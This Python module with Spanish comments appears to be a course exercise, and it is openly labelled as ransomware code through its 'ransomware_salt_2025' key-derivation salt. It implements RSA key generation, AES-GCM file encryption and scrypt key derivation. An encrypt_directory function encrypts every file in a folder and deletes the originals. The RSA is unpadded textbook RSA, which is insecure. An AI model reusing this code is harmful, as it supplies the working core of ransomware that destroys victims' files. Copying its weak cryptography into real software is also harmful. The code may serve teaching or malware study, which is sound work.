from Crypto.Util import number
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Protocol.KDF import scrypt
import struct
import os

# Constantes para cifrado de archivos
MAGIC = b"AG02"
CHUNK = 64 * 1024
NONCE_LEN = 12
TAG_LEN = 16


class RSA:
    """
    Implementa RSA segun Colab de referencia
    """
    def Grsa(self, l, e):
        """
        Genera las llave privada sk
        y la publica pk

        Input
        l: longitud
        e: impar de entrada
        """
        p = number.getPrime(l)
        while number.GCD(p-1, e) != 1:
            p = number.getPrime(l)
        
        q = number.getPrime(l)
        while number.GCD(q-1, e) != 1 or p == q:
            q = number.getPrime(l)
        
        phi = (p-1) * (q-1)
        d = number.inverse(e, phi)
        n = p * q
        
        pk = (n, e)
        sk = (n, d)
        return sk, pk

    def Frsa(self, pk, x):
        """
        Implementa obtencion de mensaje cifrado
        """
        (n, e) = pk
        return pow(x, e, n)
    
    def Irsa(self, sk, y):
        """
        Implementa obtencion de mensaje plano
        """
        (n, d) = sk
        return pow(y, d, n)


class FileCrypto:
    """
    Implementa encriptacion de archivos de Colab de referencia
    """
    def __init__(self, key: bytes):
        """Inicializa con una clave de 32 bytes"""
        if len(key) != 32:
            raise ValueError("La clave debe ser de 32 bytes")
        self.key = key
    
    def encrypt_file(self, in_path: str, out_path: str = None) -> str:
        """Cifra un archivo"""
        if out_path is None:
            out_path = in_path + ".enc"
        
        if not os.path.isfile(in_path):
            raise FileNotFoundError(f"Archivo no encontrado: {in_path}")
        
        nonce = get_random_bytes(NONCE_LEN)
        cipher = AES.new(self.key, AES.MODE_GCM, nonce=nonce, mac_len=TAG_LEN)
        filesize = os.path.getsize(in_path)
        
        header = bytearray()
        header += MAGIC
        header += nonce
        header += b"\x00" * TAG_LEN
        header += struct.pack("!Q", filesize)
        
        with open(in_path, "rb") as fin, open(out_path, "wb") as fout:
            fout.write(header)
            while True:
                chunk = fin.read(CHUNK)
                if not chunk:
                    break
                ct = cipher.encrypt(chunk)
                fout.write(ct)
            
            tag = cipher.digest()
            fout.seek(len(MAGIC) + NONCE_LEN)
            fout.write(tag)
        
        return out_path
    
    def decrypt_file(self, in_path: str, out_path: str = None) -> str:
        """Descifra un archivo"""
        if not os.path.isfile(in_path):
            raise FileNotFoundError(f"Archivo no encontrado: {in_path}")
        
        with open(in_path, "rb") as fin:
            magic = fin.read(len(MAGIC))
            if magic != MAGIC:
                raise ValueError("Formato corrupto")
            
            nonce = fin.read(NONCE_LEN)
            tag = fin.read(TAG_LEN)
            (filesize,) = struct.unpack("!Q", fin.read(8))
            
            cipher = AES.new(self.key, AES.MODE_GCM, nonce=nonce, mac_len=TAG_LEN)
            
            if out_path is None:
                out_path = in_path[:-4] if in_path.endswith(".enc") else in_path + ".dec"
            
            with open(out_path, "wb") as fout:
                while True:
                    chunk = fin.read(CHUNK)
                    if not chunk:
                        break
                    pt = cipher.decrypt(chunk)
                    fout.write(pt)
                
                try:
                    cipher.verify(tag)
                except ValueError:
                    os.remove(out_path)
                    raise ValueError("Autenticación fallida")
            
            with open(out_path, "rb+") as fout2:
                fout2.truncate(filesize)
        
        return out_path
    
    def encrypt_directory(self, directory: str):
        """Cifra todos los archivos en un directorio y borra originales"""
        encrypted_files = []
        
        for filename in os.listdir(directory):
            filepath = os.path.join(directory, filename)
            
            if os.path.isfile(filepath) and not filepath.endswith(".enc"):
                enc_path = self.encrypt_file(filepath, filepath + ".enc")
                encrypted_files.append(filename)
                os.remove(filepath)  # BORRAR ORIGINAL
                print(f"✓ Cifrado: {filename}")
        
        return encrypted_files
    
    def decrypt_directory(self, directory: str, output_dir: str):
        """Descifra todos los archivos .enc en un directorio"""
        decrypted_files = []
        
        if not os.path.exists(output_dir):
            os.makedirs(output_dir)
        
        for filename in os.listdir(directory):
            if filename.endswith(".enc"):
                filepath = os.path.join(directory, filename)
                original_name = filename[:-4]  # quitar .enc
                out_path = os.path.join(output_dir, original_name)
                
                self.decrypt_file(filepath, out_path)
                decrypted_files.append(original_name)
                print(f"✓ Descifrado: {original_name}")
        
        return decrypted_files


def derive_key_from_secret(s: int, salt: bytes = b'ransomware_salt_2025') -> bytes:
    """KDF: Deriva una clave AES de 32 bytes desde el secreto 's'"""
    s_bytes = str(s).encode('utf-8')
    return scrypt(s_bytes, salt, key_len=32, N=2**14, r=8, p=1)